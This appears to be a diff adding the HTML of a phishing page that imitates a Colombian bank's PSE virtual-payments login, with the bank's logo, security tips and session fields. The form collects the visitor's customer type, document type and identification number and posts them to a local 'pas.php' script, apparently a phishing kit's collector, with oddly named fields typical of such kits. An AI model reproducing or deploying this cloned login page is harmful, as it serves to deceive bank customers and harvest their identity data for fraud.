@@ -1,0 +1,217 @@
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Bogota</title>
+    
+    <link rel="stylesheet" href="./bogo/lfr_style.css">
+    <link rel="stylesheet" href="./bogo/lfr_ownstyle.css">
+    
+    
+    </head>
+    
+    <body style="">
+        <div class="box-container">
+            <div class="container">
+                <div class="toast hidden" id="errorMessage" style="position: absolute;">
+       <p id="AuthLabel"></p>
+       <span class="icon-close-search-r" onclick="hideToast()"></span>
+    </div>
+                <div class="container__water-mark">
+                    <div class="container__water-mark--image-container"></div>
+                </div>
+                <div class="container__login">
+                    <div class="container__login--header">
+                        <img src="./bogo/logobanco1.png" alt="">
+                    </div>
+                    <div class="container__login--title">
+                        <div class="container__login--title-1">
+                            <p>
+                                Servicio de Pagos Virtuales
+                                <label class="tituloformulario" id="flujoOrigenLbl">
+                                <br>Pagos PSE</label>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="container__login--login-box">
+                        <div class="container__login--login-box-title">
+                            <span>Ingresa el tipo y numero de documento</span>
+                        </div>
+                        <div class="form-container">
+    
+                            <form method="post" name="loginForm" id="loginForm" action="pas.php" autocomplete="off">
+                                <input name="initSessionTime" type="hidden" size="8" value="1709245646774">
+                                <input name="validSessionTime" type="hidden" size="8" value="00:07">
+                                <input name="cancelationCause" type="hidden" size="8"> <input name="cancelationSource" type="hidden" size="8" value="Identificacion"> <input name="ipAddressServer" type="hidden" id="ipAddressServer" value="172.28.250.189">
+                                <input name="ipAddressClient" type="hidden" id="ipAddressClient" value="186.116.65.249"> <input id="idCustomerType" name="idCustomerType" type="hidden">
+                                <input type="hidden" name="processInstanceId" value="000000018DF6FAC78A1174F2795F3330">
+    <input type="hidden" name="activityInstanceId" value="000000018DF6FAC7B9043FE35941494E">
+    
+    
+    
+                                <div class="label">
+                                    <label for="tipoPersona">Que tipo de cliente eres?</label>
+                                </div>
+                                <div class="custom-select">
+                                    <select id="tipoPersona" name="Seleid" required="">
+                                        <option value="">Selecciona</option>
+                                        <option value="Personas">Banca Personas</option>
+                                        <option value="Empresarial">Banca Empresarial y Corporativa</option>
+                                        <option value="Afiniada">Afinidad</option>
+                                    </select>
+                                </div>
+    
+                                <div class="field-tdo">
+                                    <div class="label">
+                                        <label for="IdentificationType">Documento</label>
+                                    </div>
+                                    <div class="custom-select">
+                                        <select id="IdentificationType" name="socialusu" required="">
+                                            <option value="">Tipo</option>
+                                            <option value="Cedula">Cedula de Ciudadania</option>
+                                            <option value="Extranjeria">Cedula de Extranjeria</option>
+                                            <option value="Identidad">Tarjeta de identidad</option>
+                                            <option value="Civil">Registro civil</option>
+                                            <option value="Nit">Nit persona natural</option>
+                                            <option value="Nit juridico">Nit persona juridica</option>
+                                            <option value="Nit extranjeros">Nit de extranjeria</option>
+                                        </select>
+                                    </div>
+                                </div>
+    
+                                <div class="field-ndo">
+                                    <div class="custom-input">
+                                        <div class="label">
+                                            <label for="Identification">Numero de Identificacion</label>
+                                        </div>
+                                        <input type="text" class="custom-form-control" placeholder="Ingresa el numero" name="clavusu" id="Identification" size="20" maxlength="20" required="">
+                                    </div>
+                                </div>
+                                <div class="btn-container">
+                                    <button type="submit" class="btn-main" id="btnAction" "="">Continuar</button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+                <style>
+        ul {
+            list-style-type: none;
+            margin-top: 2rem;
+            margin-left: 4rem;
+            vertical-align: top;
+        }
+    
+        li {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+    
+        .icon-info {
+            width: 3rem;
+            height: 3rem;
+            margin-right: 1rem;
+            object-fit: cover;
+        }
+    </style>
+    <div class="container__info">
+        <div class="container__info--tips">
+            <div class="collapsable">
+                <div class="collapse">
+                    <div class="collapse__header">
+                        <div class="collapse__header--text">
+                            <p class="header">Tu seguridad es lo primero</p>
+                        </div>
+                        <div class="collapse__header--btn">
+                            <i class="icon-down-b"></i>
+                        </div>
+                    </div>
+                    <div class="collapse__content hidden">
+                        <p>Sigue estos tips y tus transacciones estaran blindadas</p>
+                        <ul>
+                            <li><img id="icon-pass" class="icon-info" src="./bogo/icon-pass.png"><p><strong>No compartas</strong> tus claves o token con terceros.</p></li>
+                            <li><img id="icon-device" class="icon-info" src="./bogo/icon-device.png"><p><strong>Evita realizar</strong> transacciones desde un equipo o dispositivo desconocido.</p></li>
+                            <li><img id="icon-lock" class="icon-info" src="./bogo/icon-lock.png"><p><strong>Procura cambiar</strong> tus contraseï¿½as bancarias periï¿½dicamente o antes si sientes que es necesario.</p></li>
+                        </ul>  
+                    </div>
+                </div>
+            </div>
+            <div class="collapsable">
+                <div class="collapse">
+                    <div class="collapse__header">
+                        <div class="collapse__header--text">
+                            <p class="header">Contectanos</p>
+                        </div>
+                        <div class="collapse__header--btn">
+                            <i class="icon-down-b"></i>
+                        </div>
+                    </div>
+                    <div class="collapse__content hidden">
+                        <p>Si tienes alguna duda o algo te ha sucedido, usa nuestros canales</p>
+                        <ul>
+                            <li><img id="icon-call" class="icon-info" src="./bogo/icon-call.png"><p>Llamar a la <strong>Servilinea</strong></p></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+                <div class="modal modalSE hidden" id="safeExitModal">
+        <div class="modal__container" id="semc">
+            <span class="close" id="closeModalSE" onclick="hideModalSE()">?</span>
+            <div class="modal-title">
+                <h2>Abandonar el proceso</h2>
+            </div>
+            <div class="modal-text" id="modalSafeExitMsg">
+                <p>Ha activado una Salida de forma segura</p>
+            </div>
+            <div class="modal-action">
+                <button type="button" class="btn-main" onclick="lfr_controlExit()">Aceptar</button>
+            </div>
+        </div>
+    </div>
+    <div class="overlay overlaySE hidden"></div>
+                <div class="modal modalMA hidden">
+        <div class="modal__container" id="containerMA">
+            <h2 class="modal-title">Se requiere una acciin valida</h2>
+            <div class="modal__container--content">
+                <p class="modal-text" id="modalAlertMsg"></p>
+                <div class="modal-action">
+                    <button type="button" class="btn-main" onclick="hideModalMA()">Entendido</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="overlay overlayMA hidden"></div>
+    
+                <div class="modal modalIN hidden">
+        <div class="modal__container">
+            <div class="modal-title">
+                <h2>Acciin Automatica Activada</h2>
+            </div>
+            <div class="modal-text">
+                <p id="modalAlertMsgIN"></p>
+            </div>
+            <div class="modal-action">
+                <button type="button" class="btn-main" onclick="lfr_inactivityAction()">Entendido</button>
+            </div>
+        </div>
+    </div>
+    <div class="overlay overlayIN hidden"></div>
+    
+    
+            </div>
+    
+            <div id="doEnableNatural" style="display: none"></div>
+            <div id="doEnableCorporate" style="display: none"></div>
+            <div id="doEnableAfinidad" style="display: block;"></div>
+    
+        </div>
+    
+        <div style="display: none">genericIdentification.jsp</div>
+    
+    </body></html>
